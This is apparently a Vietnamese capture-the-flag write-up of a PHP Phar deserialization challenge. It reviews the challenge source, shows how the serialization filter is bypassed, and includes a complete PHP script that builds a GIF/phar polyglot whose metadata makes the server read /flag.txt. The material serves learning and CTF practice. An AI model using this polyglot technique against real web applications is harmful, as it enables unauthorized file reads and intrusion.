---
layout: post
title: "HUST CTF"
time: 2026-01-26 10:11:00 +0700
tags: Writeup HUST
categories: jekyll update
---

# Phar Deserialization

[view?usp=drive_link](https://drive.google.com/file/d/12DLzefMxSTdWNZpeWbNmooQMnApDt_CR/view?usp=drive_link)

### Recon

---

Trang chủ của challenge 

![image.png](/assets/images/CTF/HUST/image.png)

Lướt qua một vòng thì thấy là phần login không có gì cho nên mình nhập tên vào tiếp tục đào sâu.

![image.png](/assets/images/CTF/HUST/image%201.png)

Quan sát thì ta có:

- **`HOME`**
- **`SACRED SCROLL`**
- **`LIBRARY`**
- **`HISTORY`**

Sau khi lướt qua thì không có gì chú ý nên mình lướt qua source. 

### Review Source Code

---

![image.png](/assets/images/CTF/HUST/image%202.png)

Thì mình được cấp 1 file source php ??? 

Và mình thấy có 1 file **`upload.php`** → cho nên mình cần đọc qua.
 
 ```php
    **<?php
    require_once 'config.php';
    requireLogin();
    
    $message = '';
    $uploadedFile = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar'])) {
        $file = $_FILES['avatar'];
        $uploadDir = 'assets/uploads/';
    
        if (!file_exists($uploadDir)) {
            mkdir($uploadDir, 0755, true);
        }
        $isImage = getimagesize($file['tmp_name']);
        $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
        $fileType = mime_content_type($file['tmp_name']);
    
        if ($isImage !== false && in_array($fileType, $allowedTypes)) {
            $filename = md5(uniqid() . $file['name']) . '.jpg';
            $targetPath = $uploadDir . $filename;
    
            if (move_uploaded_file($file['tmp_name'], $targetPath)) {
                $message = "Avatar uploaded successfully!";
                $uploadedFile = $targetPath;
            } else {
                $message = "Failed to move uploaded file.";
            }
        } else {
            $message = "Invalid image file. The spirits reject this offering.";
        }
    }
    
    include 'includes/header.php';
    ?>
```
    

Đoạn code backend này thực hiện kiểm tra xem **`MIME CONTENT TYPE`** trong blacklist như vậy thì mình hoàn toàn có thể bypass. 

Và nó có kiểm tra thêm size của hình ảnh qua hàm **`getimagesize`** → check header của file hình ảnh. 

Xong mình tiếp tục đi mò qua file **`scroll.php`** 

```php
    <?php
    require_once 'config.php';
    require_once 'includes/validator.php';
    require_once 'includes/divine.php';
    requireLogin();
    
    class Scroll
    {
        public $path;
    
        public function __construct($path = null)
        {
            $this->path = $path;
        }
    
        public function __toString()
        {
            if (empty($this->path)) {
                return "This scroll has no path.";
            }
    
            if (file_exists($this->path)) {
                return "The scroll exists in this realm.";
            }
    
            return "The scroll cannot be found.";
        }
    }
    
    $result = null;
    $error = null;
    
    $default_seal = serialize(new Scroll("includes/header.php"));
    
    $input_seal = $_GET['seal'] ?? $default_seal;
    
    if (!empty($input_seal)) {
        if (!isset($_SESSION['attempts'])) {
            $_SESSION['attempts'] = 0;
        }
    
        $validatedSeal = validateSeal($input_seal);
    
        $isFailure = false;
    
        if ($validatedSeal === false) {
            $error = "The spirits rejected your offering.";
            $isFailure = true;
        } else {
            try {
                $scroll = @unserialize($validatedSeal);
    
                if ($scroll === false) {
                    $error = "The seal is broken.";
                    $isFailure = true;
                } else {
                    $result = "Oracle says: " . $scroll;
                }
            } catch (Exception $e) {
                $error = "The ritual failed.";
                $isFailure = true;
            }
        }
    
        if ($isFailure) {
            $_SESSION['attempts']++;
            if ($_SESSION['attempts'] >= 5) {
                session_destroy();
                header("Location: login.php?error=banished");
                exit;
            }
        }
    }
    
    include 'includes/header.php';
    ?>
```
    

Mình thấy có class **`Scroll`** dùng để check xem 1 file có tồn tại qua hàm **`file_exists`** được truyền vào thuộc tính **`$path`** 

Và nó nhận dữ liệu đã serialize qua **`$_GET['seal'])`** , nhưng trước đó nó phải đi qua hàm **`validateSeal`** tại file **`validator.php`**

```php
    <?php
    function validateSeal($input)
    {
        $input = str_replace('.', '', $input);
    
        if (strpos($input, 'O:6:') !== false) {
            return false;
        }
        if (stripos($input, 'flag') !== false) {
            return false;
        }
        if (stripos($input, 'DivineKnowledge') !== false) {
            return false;
        }
    
        return $input;
    }
    
```
    

Như vậy thì mình thấy tại **`$_GET['seal'])`** đã chặn **`.`** , **`O:6:`** , **`flag`** và chuỗi string **`DivineKnowledge`** 

Như vậy mình tìm tới file **`divine.php`** 

 ```php
    <?php
    class DivineKnowledge
    {
        public $scroll_path;
    
        public function __construct($path)
        {
            $this->scroll_path = $path;
        }
    
        public function __wakeup()
        {
            ob_end_clean();
            echo "Divine Awakening: " . file_get_contents($this->scroll_path);
            die();
        }
    }
```
    

Nhìn thấy có hàm **`__wakeup()`** đây là magic method và nó dùng **`file_get_contents`** thì nếu mình truyền **`$scroll_path`** thì sẽ đọc được **`flag`**

Như vậy tới đây thì mình đã khẳng định được bài này liên quan đến Serialize. 

### Liên kết Chain

---

Như vậy mình tổng hợp lại các dữ kiện đã tìm được:

- upload file → vậy mình bypass để upload file gì??
- **`seal`** nhận dữ liệu đã serialize nhưng có filter
- magic method trong class **`DivineKnowledge`**

Sau khi mình tìm hiểu tìm kiếm trên google thì có một kỹ thuật liên quan đó là **`Phar Deserialization`** và đọc qua thì mình biết rằng mình sẽ phải khai thác qua file **`phar`** 

Có nghĩa là mình cần gói một đoạn serialize gọi tới **`__wakeup`** trong file **`phar`** sau đó mình **`upload`** rồi truy cập qua `seal` để trigger qua hàm **`file_exists`** vì khi gọi hàm này thì dữ liệu bị serialize sẽ được unserialize lại thì sẽ trigger lên hàm **`__wakeup`** → lấy được **`flag`** 

## Exploit

---

### Bypass `seal`

Đầu tiên mình sẽ giải quyết phần filter tại biến **`seal`** trước. 

Sau khi tìm đọc repo **`phpggc`** thì mình thấy có đoạn như sau: 

![image.png](/assets/images/CTF/HUST/image%203.png)

Như vậy mình sẽ giải quyết đoạn filter dấu `.` bằng kí tự ASCII.

Và đoạn bypass **`O:6:`** thì mình có thể dùng **`O:+6:`** hoặc **`O:06`** thì sau khi thử xác nhận có thể bypass qua bằng **`O:06:`** 

Mình sẽ thử **`upload`** 1 file lên và sau đó mình thử đoạn phân tích bypass trên. 

![image.png](/assets/images/CTF/HUST/image%204.png)

Thì thu được 1 đường dẫn lưu file.

![image.png](/assets/images/CTF/HUST/image%205.png)

Mình tạo dữ liệu serialize để nhét vào **`seal`** 

![image.png](/assets/images/CTF/HUST/image%206.png)

Sau đó mình quăng vào burpsuite.

![image.png](/assets/images/CTF/HUST/image%207.png)

Như vậy xác nhận là file mình upload đã tồn tại. 

### Tạo file `phar`

Sau khi bypass được **`seal`** thì mình sẽ tìm hiểu file **`phar`** có những gì?

Trong một file **`phar`** gồm có 4 phần:

- **`Stub`**
- **`Manifest`**
- **`File Content`**
- **`Signature`**

**`stub`** đây là phần đầu tiên của **`phar`**, chứa mã nguồn chính, code gì cũng được miến cuối cùng phải có **`__HALT_COMPILER()`**:

```php
**<?php echo 'STUB!';__HALT_COMPILER() ?>**
```

**`Manifest`** chứa các trường siêu dữ liệu (**`metadata`**) bao gồm thông tin về archive và các file trong archive. **Điều quan trọng là các `metadata` này được lưu trữ dạng `serialized format`**. Bất cứ một “hoạt động tệp” tác động đến tệp PHAR mà sử dụng wrapper **phar://** thì những metadata này sẽ tự động **deserialized**.

![image.png](/assets/images/CTF/HUST/image%208.png)

Để metadata vào mình dùng

```bash
	
**PHAR: : setMetadata (mixed $metadata)**
```

**`file contents`:** là các file thực có trong archive, chỉ vậy

```bash
**//adds thêm file bằng $path to the archive as $name
PHAR: : addFile (string $path, $name)

 //adds $contents to the archive as $name
PHAR: : addFromString (string $name, string $contents)**
```

**`Signature`:** là một hàm băm của file archive, ta phải có chữ ký hợp lệ nếu muốn truy cập file archive từ PHP

Cách build 01 file phar:

```bash
	
**php --define phar.readonly=0 <name>.php**
```

Như vậy thì mình sẽ gọi file **`phar`** như sau:

![image.png](/assets/images/CTF/HUST/image%209.png)

Như vậy mình sẽ upload lên file **`phar`** lên nhưng mình phải bypass với magic byte file là **`GIF89a`** 

![image.png](/assets/images/CTF/HUST/2d0ad717-f87b-4832-bc40-1d01205d3793.png)

Sau đó mình thu được đường dẫn **`assets/uploads/7b8e56340a8377cdfb46a8f801137ca7.jpg` →** mình truy cập vào **`seal`**

![image.png](/assets/images/CTF/HUST/image%2010.png)

Mình trigger qua BurpSuite, nhưng mà kết qua ko mong muốn rồi.

![image.png](/assets/images/CTF/HUST/b2ec1f63-c895-455b-9c0c-8c1d54982a8f.png)

Cho nên mình tiếp tục đặt dấu ? là tác giả cho thêm source PHP làm gì nhỉ. Mình quyết định tải source gốc và tiến hành diff source.

![image.png](/assets/images/CTF/HUST/image%2011.png)

Như vậy tác giả đã chặn thêm đoạn serialize khi mình gọi payload trong file **`phar`**

Như vậy mình cần phải tính đến việc tinh chỉnh payload trigger magic method. 

Sau khi tìm kiếm thì mình thấy 1 hàm **`pack()`** → nó sẽ thực hiện chuyển các tham số thành binary string theo **`format`**.

![image.png](/assets/images/CTF/HUST/image%2012.png)

Quan sát lại file format của **`phar`** 

![image.png](/assets/images/CTF/HUST/image%2013.png)

Như vậy tất cả các giá trị lớn hơn 1 thì đều phải được lưu theo format **`little-endian`** 

Quan sát trong **`format`** của hàm **`pack()`** 

![image.png](/assets/images/CTF/HUST/image%2014.png)

Đến đây thì mình có mùi phải build một file **`phar`** với phần manifest phải được tinh chỉnh vì đó là phần chứa metadata.

```php
<?php
    
    $phar_name = "exploit.phar";
    $img_name = "exploit.gif";
    @unlink($phar_name);
    @unlink($img_name);
    
    // 1. Tinh chỉnh payload một cách manual 
    $file = "/flag.txt";
    $file_hex = "";
    
    for ($i = 0; $i < strlen($file); $i++) {
        $file_hex .= "\\" . dechex(ord($file[$i]));
    }
    
    $file_length = 9;
    $serialize_data = 'O:015:"DivineKnowledge":1:{s:11:"scroll_path";S:' . $file_length . ':"' . $file_hex . '";}';
    
    echo "Payload Length: " . strlen($serialize_data) . "\n";
    echo "Payload: " . $serialize_data . "\n";
    
    // 2. Build Phar Manifest 
    $manifest = "";
    $manifest .= pack('V', 1); // number of files 
    $manifest .= pack('v', 0x1111); // Manifest API version
    $manifest .= pack('V', 0x10000); // Global Flags
    $manifest .= pack('V', 0); // Alias Length (0)
    
    // Metada Length + Metadata 
    $manifest .= pack('V', strlen($serialize_data));
    $manifest .= $serialize_data;
    
    // File Entry: image (do not to bypass weird metadata check)
    $filename = "image";
    $file_content = "fake_image";
    $manifest .= pack('V', strlen($filename));
    $manifest .= $filename;
    $manifest .= pack('V', strlen($file_content));
    $manifest .= pack('V', 0);
    $manifest .= pack('V', strlen($file_content));
    $manifest .= pack('V', crc32($file_content)); // Correct CRC32
    $manifest .= pack('V', 0x00000000);
    $manifest .= pack('V', 0); // Metadata len for FILE
    
    // 3. Construct Complete Phar 
    // GIF Header (1x1 GIF)
    $gif_header = "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b";
    
    // Append PHP Stub directly after valid GIF 
    $stub = $gif_header . '<?php __HALT_COMPILER(); ?>' . "\r\n";
    
    $manifest_len = strlen($manifest);
    $phar_content = $stub;
    $phar_content .= pack('V', $manifest_len);
    $phar_content .= $manifest;
    
    // File Content
    $phar_content .= $file_content;
    
    // 4. Calculate checksum (SHA1)
    $checksum = sha1($phar_content, true);
    
    // 5. Append Signature
    $phar_content .= $checksum;
    $phar_content .= pack('V', 0x0002); // SHA1
    $phar_content .= "GBMB";
    
    file_put_contents($img_name, $phar_content);
    echo "Created Munal GIF Polyglot: $img_name\n";    
```
    

Thì ở đây có thể đặt ra một câu hỏi là tại sao ko dùng **`GIF89a`** trần thôi ?? phải dùng GIF 1x1 một cách đầy đủ vì hàm **`getimagesize`** chỉ chấp nhận một cách đầy đủ.

Sau khi mình tạo ra file **`.gif`** → lặp lại các bước như trên.

![image.png](/assets/images/CTF/HUST/image%2015.png)

### Reference

---

- https://github.com/ambionics/phpggc
- https://nhattruong.blog/2021/05/29/khai-thac-lo-hong-phar-deserialization-nhu-the-nao/
- https://sec.vnpt.vn/2019/08/ky-thuat-khai-thac-lo-hong-phar-deserialization
- https://www.php.net/manual/en/phar.fileformat.phar.php
- https://www.php.net/manual/en/function.pack.php
- https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf